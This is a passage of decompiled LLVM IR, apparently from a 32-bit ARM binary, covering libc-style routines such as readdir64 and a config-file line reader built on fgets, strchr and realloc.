  %v3_17324 = load i32, i32* %v2_17324, align 4
  %v1_17328 = add i32 %v0_17324, 56
  %v2_17328 = inttoptr i32 %v1_17328 to i32*
  %v3_17328 = load i32, i32* %v2_17328, align 4
  store i32 %v3_17328, i32* %r2.global-to-local, align 4
  %v1_1732c = load i32, i32* %r6.global-to-local, align 4
  %v2_1732c = add i32 %v1_1732c, 52
  %v3_1732c = inttoptr i32 %v2_1732c to i32*
  store i32 %v3_17324, i32* %v3_1732c, align 4
  %v0_17330 = load i32, i32* %r2.global-to-local, align 4
  %v1_17330 = load i32, i32* %r6.global-to-local, align 4
  %v2_17330 = add i32 %v1_17330, 48
  %v3_17330 = inttoptr i32 %v2_17330 to i32*
  store i32 %v0_17330, i32* %v3_17330, align 4
  %v0_17334 = load i32, i32* %r5.global-to-local, align 4
  %v1_17334 = add i32 %v0_17334, 72
  %v1_17338 = inttoptr i32 %v1_17334 to i32*
  %v2_17338 = load i32, i32* %v1_17338, align 4
  %v3_17338 = add i32 %v0_17334, 76
  %v4_17338 = inttoptr i32 %v3_17338 to i32*
  %v5_17338 = load i32, i32* %v4_17338, align 4
  store i32 %v5_17338, i32* %r1.global-to-local, align 4
  %v0_1733c = load i32, i32* %r6.global-to-local, align 4
  %v1_1733c = add i32 %v0_1733c, 56
  %v1_17340 = inttoptr i32 %v1_1733c to i32*
  store i32 %v2_17338, i32* %v1_17340, align 4
  %v3_17340 = add i32 %v0_1733c, 60
  %v4_17340 = inttoptr i32 %v3_17340 to i32*
  %v5_17340 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17340, i32* %v4_17340, align 4
  %v0_17344 = load i32, i32* %r5.global-to-local, align 4
  %v1_17344 = add i32 %v0_17344, 80
  %v1_17348 = inttoptr i32 %v1_17344 to i32*
  %v2_17348 = load i32, i32* %v1_17348, align 4
  %v3_17348 = add i32 %v0_17344, 84
  %v4_17348 = inttoptr i32 %v3_17348 to i32*
  %v5_17348 = load i32, i32* %v4_17348, align 4
  store i32 %v5_17348, i32* %r1.global-to-local, align 4
  %v0_1734c = load i32, i32* %r6.global-to-local, align 4
  %v1_1734c = add i32 %v0_1734c, 64
  %v1_17350 = inttoptr i32 %v1_1734c to i32*
  store i32 %v2_17348, i32* %v1_17350, align 4
  %v3_17350 = add i32 %v0_1734c, 68
  %v4_17350 = inttoptr i32 %v3_17350 to i32*
  %v5_17350 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17350, i32* %v4_17350, align 4
  %v0_17354 = load i32, i32* %r5.global-to-local, align 4
  %v1_17354 = add i32 %v0_17354, 16
  %v2_17354 = inttoptr i32 %v1_17354 to i32*
  %v3_17354 = load i32, i32* %v2_17354, align 4
  %v1_17358 = load i32, i32* %r6.global-to-local, align 4
  %v2_17358 = add i32 %v1_17358, 16
  %v3_17358 = inttoptr i32 %v2_17358 to i32*
  store i32 %v3_17354, i32* %v3_17358, align 4
  %v0_1735c = load i32, i32* %r5.global-to-local, align 4
  %v1_1735c = add i32 %v0_1735c, 88
  %v1_17360 = add i32 %v0_1735c, 20
  %v2_17360 = inttoptr i32 %v1_17360 to i32*
  %v3_17360 = load i32, i32* %v2_17360, align 4
  store i32 %v3_17360, i32* %r2.global-to-local, align 4
  %v1_17364 = inttoptr i32 %v1_1735c to i32*
  %v2_17364 = load i32, i32* %v1_17364, align 4
  %v3_17364 = add i32 %v0_1735c, 92
  %v4_17364 = inttoptr i32 %v3_17364 to i32*
  %v5_17364 = load i32, i32* %v4_17364, align 4
  store i32 %v5_17364, i32* %r1.global-to-local, align 4
  %v0_17368 = load i32, i32* %r6.global-to-local, align 4
  %v1_17368 = add i32 %v0_17368, 72
  %v1_1736c = inttoptr i32 %v1_17368 to i32*
  store i32 %v2_17364, i32* %v1_1736c, align 4
  %v3_1736c = add i32 %v0_17368, 76
  %v4_1736c = inttoptr i32 %v3_1736c to i32*
  %v5_1736c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1736c, i32* %v4_1736c, align 4
  %v0_17370 = load i32, i32* %r2.global-to-local, align 4
  %v1_17370 = load i32, i32* %r6.global-to-local, align 4
  %v2_17370 = add i32 %v1_17370, 20
  %v3_17370 = inttoptr i32 %v2_17370 to i32*
  store i32 %v0_17370, i32* %v3_17370, align 4
  %v0_17374 = load i32, i32* %ip.global-to-local, align 4
  %v1_17374 = load i32, i32* %r6.global-to-local, align 4
  %v2_17374 = add i32 %v1_17374, 24
  %v3_17374 = inttoptr i32 %v2_17374 to i32*
  store i32 %v0_17374, i32* %v3_17374, align 4
  %v0_17378 = load i32, i32* %lr.global-to-local, align 4
  %v1_17378 = load i32, i32* %r6.global-to-local, align 4
  %v2_17378 = add i32 %v1_17378, 28
  %v3_17378 = inttoptr i32 %v2_17378 to i32*
  store i32 %v0_17378, i32* %v3_17378, align 4
  %v2_1737c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1737c, i32* %r4.global-to-local, align 4
  ret i32 %v2_17364

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r6, align 4
  %v1_17398 = add i32 %tmp, 24
  store i32 %v1_17398, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_173b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  store i32 %v4_173b0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_173b0)
  %v0_173c4 = load i32, i32* @r6, align 4
  %v2_173c4 = add i32 %v0_173c4, 16
  %v3_173c4 = inttoptr i32 %v2_173c4 to i32*
  %v4_173c4 = load i32, i32* %v3_173c4, align 4
  store i32 %v4_173c4, i32* %ip.global-to-local, align 4
  store i32 95184, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_173c4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_173d4

dec_label_pc_173d4:                               ; preds = %dec_label_pc_17404, %entry
  %v0_173d4 = load i32, i32* @r5, align 4
  %v1_173d4 = add i32 %v0_173d4, 4
  %v2_173d4 = inttoptr i32 %v1_173d4 to i32*
  %v3_173d4 = load i32, i32* %v2_173d4, align 4
  %v4_173d4 = add i32 %v0_173d4, 8
  %v5_173d4 = inttoptr i32 %v4_173d4 to i32*
  %v6_173d4 = load i32, i32* %v5_173d4, align 4
  %tmp10 = icmp ugt i32 %v6_173d4, %v3_173d4
  br i1 %tmp10, label %dec_label_pc_17404, label %dec_label_pc_173e0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173d4
  %v1_173e0 = inttoptr i32 %v0_173d4 to i32*
  %v2_173e0 = load i32, i32* %v1_173e0, align 4
  %v1_173e4 = add i32 %v0_173d4, 12
  %v2_173e4 = inttoptr i32 %v1_173e4 to i32*
  %v3_173e4 = load i32, i32* %v2_173e4, align 4
  %v1_173e8 = add i32 %v0_173d4, 20
  %v2_173e8 = inttoptr i32 %v1_173e8 to i32*
  %v3_173e8 = load i32, i32* %v2_173e8, align 4
  %v4_173ec = inttoptr i32 %v3_173e4 to i32*
  %v5_173ec = call i32 @__getdents64(i32 %v2_173e0, i32* %v4_173ec, i32 %v3_173e8, i32 %v6_173d4)
  %tmp9 = icmp slt i32 %v5_173ec, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_173fc

.thread:                                          ; preds = %dec_label_pc_173e0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_17434

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173e0
  %v1_173fc = load i32, i32* @r5, align 4
  %v2_173fc = add i32 %v1_173fc, 8
  %v3_173fc = inttoptr i32 %v2_173fc to i32*
  store i32 %v5_173ec, i32* %v3_173fc, align 4
  %v0_17400 = load i32, i32* @r7, align 4
  %v1_17400 = load i32, i32* @r5, align 4
  %v2_17400 = add i32 %v1_17400, 4
  %v3_17400 = inttoptr i32 %v2_17400 to i32*
  store i32 %v0_17400, i32* %v3_17400, align 4
  %v0_17404.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_173d4, %dec_label_pc_173fc
  %v1_17428 = phi i32 [ %v0_173d4, %dec_label_pc_173d4 ], [ %v0_17404.pre, %dec_label_pc_173fc ]
  %v1_17404 = add i32 %v1_17428, 4
  %v2_17404 = inttoptr i32 %v1_17404 to i32*
  %v3_17404 = load i32, i32* %v2_17404, align 4
  %v1_17408 = add i32 %v1_17428, 12
  %v2_17408 = inttoptr i32 %v1_17408 to i32*
  %v3_17408 = load i32, i32* %v2_17408, align 4
  %v2_1740c = add i32 %v3_17408, %v3_17404
  store i32 %v2_1740c, i32* @r4, align 4
  %v3_17410 = inttoptr i32 %v2_1740c to i32*
  %v4_17410 = load i32, i32* %v3_17410, align 4
  %v1_17414 = add i32 %v2_1740c, 4
  %v2_17414 = inttoptr i32 %v1_17414 to i32*
  %v3_17414 = load i32, i32* %v2_17414, align 4
  %v1_17418 = add i32 %v2_1740c, 16
  %v2_17418 = inttoptr i32 %v1_17418 to i16*
  %v3_17418 = load i16, i16* %v2_17418, align 2
  %v4_17418 = zext i16 %v3_17418 to i32
  %v1_1741c = add i32 %v2_1740c, 8
  %v2_1741c = inttoptr i32 %v1_1741c to i32*
  %v3_1741c = load i32, i32* %v2_1741c, align 4
  store i32 %v3_1741c, i32* %ip.global-to-local, align 4
  %v2_17420 = add i32 %v4_17418, %v3_17404
  %v2_17424 = or i32 %v3_17414, %v4_17410
  %v4_17424 = icmp eq i32 %v2_17424, 0
  store i32 %v2_17420, i32* %v2_17404, align 4
  %v0_1742c = load i32, i32* %ip.global-to-local, align 4
  %v1_1742c = load i32, i32* @r5, align 4
  %v2_1742c = add i32 %v1_1742c, 16
  %v3_1742c = inttoptr i32 %v2_1742c to i32*
  store i32 %v0_1742c, i32* %v3_1742c, align 4
  br i1 %v4_17424, label %dec_label_pc_173d4, label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_17404, %.thread
  %v0_17440 = load i32, i32* @r6, align 4
  %v2_17440 = add i32 %v0_17440, 44
  %v3_17440 = inttoptr i32 %v2_17440 to i32*
  %v4_17440 = load i32, i32* %v3_17440, align 4
  store i32 %v4_17440, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17440)
  %v0_1744c = load i32, i32* @r4, align 4
  ret i32 %v0_1744c

; uselistorder directives
  uselistorder i32 %v2_1740c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_17428, { 1, 0 }
  uselistorder i32 %v6_173d4, { 1, 0 }
  uselistorder i32 %v0_173d4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_17404, { 1, 0 }
}

define i32 @function_17460(i32 %arg1) local_unnamed_addr {
dec_label_pc_17460:
  %v0_17460 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17460, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17460
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17460, %bb
  %v4_1746c = phi i32 [ %arg1, %dec_label_pc_17460 ], [ 0, %bb ]
  ret i32 %v4_1746c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_17470 = load i32, i32* @r4, align 4
  %v6_17470 = load i32, i32* @r5, align 4
  %v9_17470 = load i32, i32* @r6, align 4
  %v12_17470 = load i32, i32* @r7, align 4
  %v15_17470 = load i32, i32* @r8, align 4
  %v18_17470 = load i32, i32* @sb, align 4
  %v21_17470 = load i32, i32* @sl, align 4
  %v24_17470 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_17474 = icmp eq i32* %arg1, null
  store i1 %v2_17474, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_17474, label %dec_label_pc_17784, label %dec_label_pc_1748c

dec_label_pc_1748c:                               ; preds = %entry
  %v1_1748c = urem i32 %arg3, 256
  store i32 %v1_1748c, i32* @sb, align 4
  %v1_17490 = udiv i32 %arg3, 256
  %v3_17494 = urem i32 %v1_17490, 256
  %v3_17498 = mul nuw nsw i32 %v1_1748c, 4
  %v1_174a0 = or i32 %v3_17498, 1
  %v1_174ac = and i32 %arg3, 131072
  %v1_174b0 = add nsw i32 %v1_1748c, -1
  %v1_174bc = and i32 %arg3, 262144
  store i32 %v1_174bc, i32* %r2.global-to-local, align 4
  %v1_174c0 = and i32 %arg3, 65536
  store i32 %v1_174c0, i32* %r3.global-to-local, align 4
  store i32 %v1_174c0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_174d0 = add i32 %arg4, 1
  store i32 %v1_174d0, i32* @sl, align 4
  %v2_17648 = icmp eq i32 %v1_174ac, 0
  %v1_176a0 = inttoptr i32 %arg2 to i32*
  %v2_176b8 = icmp eq i32 %v1_174bc, 0
  br label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174d4.backedge, %dec_label_pc_1748c
  %v2_174f0 = phi i32 [ %v0_174d4.pre, %dec_label_pc_174d4.backedge ], [ %tmp, %dec_label_pc_1748c ]
  %v1_174d4 = add i32 %v2_174f0, 4
  %v2_174d4 = inttoptr i32 %v1_174d4 to i32*
  %v3_174d4 = load i32, i32* %v2_174d4, align 4
  store i32 %v3_174d4, i32* %r3.global-to-local, align 4
  %v2_174d8 = icmp eq i32 %v3_174d4, 0
  store i1 %v2_174d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174d8, label %dec_label_pc_174e0, label %dec_label_pc_17528

dec_label_pc_174e0:                               ; preds = %dec_label_pc_174d4
  %v1_174e0 = add i32 %v2_174f0, 16
  %v2_174e0 = inttoptr i32 %v1_174e0 to i32*
  %v3_174e0 = load i32, i32* %v2_174e0, align 4
  store i32 %v3_174e0, i32* %r3.global-to-local, align 4
  %v2_174e4 = icmp eq i32 %v3_174e0, 0
  store i1 %v2_174e4, i1* %cpsr_z.global-to-local, align 1
  %v1_174e8 = add i32 %v2_174f0, 8
  %v2_174e8 = inttoptr i32 %v1_174e8 to i32*
  %v3_174e8 = load i32, i32* %v2_174e8, align 4
  store i32 %v3_174e8, i32* %r3.global-to-local, align 4
  br i1 %v2_174e4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_174e0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_174e0, align 4
  %v0_174f4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_174e0, %bb
  %v0_174f4 = phi i32 [ %v0_174f4.pre, %bb ], [ %v3_174e8, %dec_label_pc_174e0 ]
  %v2_174f4 = icmp eq i32 %v0_174f4, 0
  store i1 %v2_174f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174f4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_174a0, i32* %r3.global-to-local, align 4
  %v2_174fc = load i32, i32* @r5, align 4
  %v3_174fc = add i32 %v2_174fc, 8
  %v4_174fc = inttoptr i32 %v3_174fc to i32*
  store i32 %v1_174a0, i32* %v4_174fc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_17500 = load i32, i32* @r5, align 4
  %v1_17500 = add i32 %v0_17500, 16
  %v2_17500 = inttoptr i32 %v1_17500 to i32*
  %v3_17500 = load i32, i32* %v2_17500, align 4
  store i32 %v3_17500, i32* %r0.global-to-local, align 4
  %v1_17504 = add i32 %v0_17500, 8
  %v2_17504 = inttoptr i32 %v1_17504 to i32*
  %v3_17504 = load i32, i32* %v2_17504, align 4
  store i32 %v3_17504, i32* %r3.global-to-local, align 4
  %v2_17508 = add i32 %v3_17504, %v3_17500
  store i32 %v2_17508, i32* @r0, align 4
  %v0_1750c = call i32 @malloc()
  store i32 %v0_1750c, i32* %r0.global-to-local, align 4
  %v2_17510 = icmp eq i32 %v0_1750c, 0
  store i1 %v2_17510, i1* %cpsr_z.global-to-local, align 1
  %v1_17514 = load i32, i32* @r5, align 4
  %v2_17514 = add i32 %v1_17514, 4
  %v3_17514 = inttoptr i32 %v2_17514 to i32*
  store i32 %v0_1750c, i32* %v3_17514, align 4
  br i1 %v2_17510, label %dec_label_pc_17784, label %dec_label_pc_1751c

dec_label_pc_1751c:                               ; preds = %.thread
  %v0_1751c = load i32, i32* @r5, align 4
  %v1_1751c = add i32 %v0_1751c, 20
  %v2_1751c = inttoptr i32 %v1_1751c to i32*
  %v3_1751c = load i32, i32* %v2_1751c, align 4
  %v1_17520 = or i32 %v3_1751c, 1
  store i32 %v1_17520, i32* %r3.global-to-local, align 4
  store i32 %v1_17520, i32* %v2_1751c, align 4
  %v0_17528.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17528

dec_label_pc_17528:                               ; preds = %dec_label_pc_174d4, %dec_label_pc_1751c
  %v1_17530 = phi i32 [ %v2_174f0, %dec_label_pc_174d4 ], [ %v0_17528.pre, %dec_label_pc_1751c ]
  %v1_17528 = add i32 %v1_17530, 4
  %v2_17528 = inttoptr i32 %v1_17528 to i32*
  %v3_17528 = load i32, i32* %v2_17528, align 4
  store i32 %v3_17528, i32* %r2.global-to-local, align 4
  %v4_17528 = add i32 %v1_17530, 8
  %v5_17528 = inttoptr i32 %v4_17528 to i32*
  %v6_17528 = load i32, i32* %v5_17528, align 4
  %v2_1752c = add i32 %v6_17528, %v3_17528
  store i32 %v2_1752c, i32* %r3.global-to-local, align 4
  %v2_17530 = add i32 %v1_17530, 12
  %v3_17530 = inttoptr i32 %v2_17530 to i32*
  store i32 %v2_1752c, i32* %v3_17530, align 4
  %v0_17534 = load i32, i32* @fp, align 4
  store i32 %v0_17534, i32* @r6, align 4
  br label %dec_label_pc_17538

dec_label_pc_17538:                               ; preds = %dec_label_pc_175c4, %dec_label_pc_175b0, %dec_label_pc_17528
  %v0_17540 = phi i32 [ %v0_17534, %dec_label_pc_17528 ], [ %v1_175b0, %dec_label_pc_175b0 ], [ %v0_17540.pre.pre, %dec_label_pc_175c4 ]
  %v0_17538 = load i32, i32* @r5, align 4
  %v1_17538 = add i32 %v0_17538, 12
  store i32 %v1_17538, i32* %r0.global-to-local, align 4
  %v1_1753c = inttoptr i32 %v1_17538 to i32*
  %v2_1753c = load i32, i32* %v1_1753c, align 4
  store i32 %v2_1753c, i32* %r0.global-to-local, align 4
  %v3_1753c = add i32 %v0_17538, 16
  %v4_1753c = inttoptr i32 %v3_1753c to i32*
  %v5_1753c = load i32, i32* %v4_1753c, align 4
  %v2_17540 = add i32 %v2_1753c, %v0_17540
  store i32 %v2_17540, i32* %r0.global-to-local, align 4
  %v2_17544 = sub i32 %v5_1753c, %v0_17540
  %v1_17548 = inttoptr i32 %v0_17538 to i32*
  %v2_17548 = load i32, i32* %v1_17548, align 4
  store i32 %v2_17548, i32* %r2.global-to-local, align 4
  %v3_1754c = call i32 @fgets(i32 %v2_17540, i32 %v2_17544, i32 %v2_17548)
  store i32 %v3_1754c, i32* %r0.global-to-local, align 4
  store i32 %v3_1754c, i32* %r4.global-to-local, align 4
  %v2_17550 = icmp eq i32 %v3_1754c, 0
  store i1 %v2_17550, i1* %cpsr_z.global-to-local, align 1
  %v0_17558 = load i32, i32* @r5, align 4
  %v1_17558 = add i32 %v0_17558, 12
  br i1 %v2_17550, label %dec_label_pc_17558, label %dec_label_pc_17570

dec_label_pc_17558:                               ; preds = %dec_label_pc_17538
  store i32 %v1_17558, i32* %r0.global-to-local, align 4
  %v1_1755c = inttoptr i32 %v1_17558 to i32*
  %v2_1755c = load i32, i32* %v1_1755c, align 4
  store i32 %v2_1755c, i32* %r0.global-to-local, align 4
  %v3_1755c = add i32 %v0_17558, 16
  %v4_1755c = inttoptr i32 %v3_1755c to i32*
  %v5_1755c = load i32, i32* %v4_1755c, align 4
  store i32 %v5_1755c, i32* %r2.global-to-local, align 4
  %v3_17564 = inttoptr i32 %v2_1755c to i8*
  %v4_17564 = call i32 @__GI_memset(i8* %v3_17564, i32 0, i32 %v5_1755c)
  store i32 %v4_17564, i32* %r0.global-to-local, align 4
  %v0_17568 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17788

dec_label_pc_17570:                               ; preds = %dec_label_pc_17538
  %v2_17570 = inttoptr i32 %v1_17558 to i32*
  %v3_17570 = load i32, i32* %v2_17570, align 4
  store i32 %v3_17570, i32* @r4, align 4
  %v1_17574 = load i32, i32* @r6, align 4
  %v2_17574 = add i32 %v1_17574, %v3_17570
  %v3_17574 = inttoptr i32 %v2_17574 to i8*
  store i32 %v2_17574, i32* %r0.global-to-local, align 4
  %v3_17578 = call i32 @strlen(i8* %v3_17574)
  %v0_17580 = load i32, i32* @r6, align 4
  %v2_17580 = add i32 %v0_17580, %v3_17578
  store i32 %v2_17580, i32* @r6, align 4
  %v0_17584 = load i32, i32* @r4, align 4
  store i32 %v0_17584, i32* @r0, align 4
  %v2_17588 = call i32 @__GI_strchr(i32 %v0_17584, i32 10)
  store i32 %v2_17588, i32* %r0.global-to-local, align 4
  %v2_1758c = icmp eq i32 %v2_17588, 0
  store i1 %v2_1758c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1758c, label %dec_label_pc_175b8, label %dec_label_pc_17594

dec_label_pc_17594:                               ; preds = %dec_label_pc_17570
  %v1_17594 = inttoptr i32 %v2_17588 to i8*
  %v2_17594 = load i8, i8* %v1_17594, align 1
  %v3_17594 = zext i8 %v2_17594 to i32
  %v1_17598 = add nuw nsw i32 %v3_17594, 255
  %v1_1759c = urem i32 %v1_17598, 256
  store i32 %v1_1759c, i32* %r3.global-to-local, align 4
  %v7_175a0 = icmp eq i32 %v1_1759c, 92
  store i1 %v7_175a0, i1* %cpsr_z.global-to-local, align 1
  %v1_175a4 = trunc i32 %v1_17598 to i8
  store i8 %v1_175a4, i8* %v1_17594, align 1
  %v0_175a8 = load i32, i32* @r6, align 4
  %v1_175a8 = add i32 %v0_175a8, -1
  store i32 %v1_175a8, i32* @r6, align 4
  %v0_175ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_175ac, label %dec_label_pc_175b0, label %dec_label_pc_1763c

dec_label_pc_175b0:                               ; preds = %dec_label_pc_17594
  %v1_175b0 = add i32 %v0_175a8, -2
  store i32 %v1_175b0, i32* @r6, align 4
  br label %dec_label_pc_17538

dec_label_pc_175b8:                               ; preds = %dec_label_pc_17570
  %v0_175b8 = load i32, i32* @r5, align 4
  %v1_175b8 = add i32 %v0_175b8, 20
  %v2_175b8 = inttoptr i32 %v1_175b8 to i32*
  %v3_175b8 = load i32, i32* %v2_175b8, align 4
  store i32 %v3_175b8, i32* %r3.global-to-local, align 4
  %v2_175bc = icmp eq i32 %v3_175b8, 0
  store i1 %v2_175bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175bc, label %dec_label_pc_175f4, label %dec_label_pc_175c4

dec_label_pc_175c4:                               ; preds = %dec_label_pc_175b8
  %v1_175c4 = add i32 %v0_175b8, 16
  %v2_175c4 = inttoptr i32 %v1_175c4 to i32*
  %v3_175c4 = load i32, i32* %v2_175c4, align 4
  store i32 %v3_175c4, i32* %r3.global-to-local, align 4
  %v1_175c8 = add i32 %v0_175b8, 8
  %v2_175c8 = inttoptr i32 %v1_175c8 to i32*
  %v3_175c8 = load i32, i32* %v2_175c8, align 4
  %v1_175cc = add i32 %v3_175c4, 4096
  store i32 %v1_175cc, i32* %r3.global-to-local, align 4
  %v2_175d0 = add i32 %v3_175c8, %v1_175cc
  store i32 %v1_175cc, i32* %v2_175c4, align 4
  %v0_175d8 = load i32, i32* @r5, align 4
  %v1_175d8 = add i32 %v0_175d8, 4
  %v2_175d8 = inttoptr i32 %v1_175d8 to i32*
  %v3_175d8 = load i32, i32* %v2_175d8, align 4
  store i32 %v3_175d8, i32* %r0.global-to-local, align 4
  %v4_175dc = inttoptr i32 %v3_175d8 to i32*
  %v5_175dc = call i32 @realloc(i32* %v4_175dc, i32 %v2_175d0, i32 %v2_17548, i32 %v1_175cc)
  store i32 %v5_175dc, i32* %r0.global-to-local, align 4
  %v0_175e0 = load i32, i32* @r5, align 4
  %v1_175e0 = add i32 %v0_175e0, 8
  %v2_175e0 = inttoptr i32 %v1_175e0 to i32*
  %v3_175e0 = load i32, i32* %v2_175e0, align 4
  %v2_175e4 = add i32 %v3_175e0, %v5_175dc
  store i32 %v2_175e4, i32* %r3.global-to-local, align 4
  %v2_175e8 = add i32 %v0_175e0, 12
  %v3_175e8 = inttoptr i32 %v2_175e8 to i32*
  store i32 %v2_175e4, i32* %v3_175e8, align 4
  %v1_175ec = load i32, i32* @r5, align 4
  %v2_175ec = add i32 %v1_175ec, 4
  %v3_175ec = inttoptr i32 %v2_175ec to i32*
  store i32 %v5_175dc, i32* %v3_175ec, align 4
  %v0_17540.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17538

dec_label_pc_175f4:                               ; preds = %dec_label_pc_175b8, %.dec_label_pc_175f4_crit_edge
  %v0_175f4 = phi i32 [ %v0_175f4.pre, %.dec_label_pc_175f4_crit_edge ], [ %v0_175b8, %dec_label_pc_175b8 ]
  %v1_175f4 = inttoptr i32 %v0_175f4 to i32*
  %v2_175f4 = load i32, i32* %v1_175f4, align 4
  store i32 %v2_175f4, i32* @r1, align 4
  %v1_175f8 = add i32 %v2_175f4, 52
  %v2_175f8 = inttoptr i32 %v1_175f8 to i32*
  %v3_175f8 = load i32, i32* %v2_175f8, align 4
  store i32 %v3_175f8, i32* %r3.global-to-local, align 4
  %v2_175fc = icmp eq i32 %v3_175f8, 0
  store i1 %v2_175fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175fc, label %dec_label_pc_17628, label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_175f4
  %v1_17604 = add i32 %v2_175f4, 16
  %v2_17604 = inttoptr i32 %v1_17604 to i32*
  %v3_17604 = load i32, i32* %v2_17604, align 4
  store i32 %v3_17604, i32* %r2.global-to-local, align 4
  %v1_17608 = add i32 %v2_175f4, 24
  %v2_17608 = inttoptr i32 %v1_17608 to i32*
  %v3_17608 = load i32, i32* %v2_17608, align 4
  store i32 %v3_17608, i32* %r3.global-to-local, align 4
  %v3_1760c = icmp ult i32 %v3_17604, %v3_17608
  %v9_1760c = icmp eq i32 %v3_17604, %v3_17608
  store i1 %v9_1760c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1760c, label %dec_label_pc_17630thread-pre-split, label %dec_label_pc_1761c

dec_label_pc_1761c:                               ; preds = %dec_label_pc_17604
  store i32 %v2_175f4, i32* %r0.global-to-local, align 4
  %v1_17620 = inttoptr i32 %v2_175f4 to i16*
  %v2_17620 = call i32 @getc_unlocked(i16* %v1_17620)
  store i32 %v2_17620, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17628:                               ; preds = %dec_label_pc_175f4
  store i32 %v2_175f4, i32* %r0.global-to-local, align 4
  %v1_1762c = call i32 @__GI_fgetc(i32 %v2_175f4)
  store i32 %v1_1762c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17630thread-pre-split:               ; preds = %dec_label_pc_17604
  %v2_17610 = inttoptr i32 %v3_17604 to i8*
  %v3_17610 = load i8, i8* %v2_17610, align 1
  %v4_17610 = zext i8 %v3_17610 to i32
  store i32 %v4_17610, i32* %r0.global-to-local, align 4
  %v6_17610 = add i32 %v3_17604, 1
  store i32 %v6_17610, i32* %r2.global-to-local, align 4
  store i32 %v6_17610, i32* %v2_17604, align 4
  %v0_17630.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17630:                               ; preds = %dec_label_pc_17630thread-pre-split, %dec_label_pc_1761c, %dec_label_pc_17628
  %v1_17634 = phi i32 [ %v0_17630.pr, %dec_label_pc_17630thread-pre-split ], [ %v2_17620, %dec_label_pc_1761c ], [ %v1_1762c, %dec_label_pc_17628 ]
  %v7_17630 = icmp eq i32 %v1_17634, 10
  store i1 %v7_17630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17630, label %dec_label_pc_1763c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_17630
  %v8_17634 = icmp eq i32 %v1_17634, -1
  store i1 %v8_17634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17634, label %dec_label_pc_1763c.loopexit, label %.dec_label_pc_175f4_crit_edge

.dec_label_pc_175f4_crit_edge:                    ; preds = %bb66
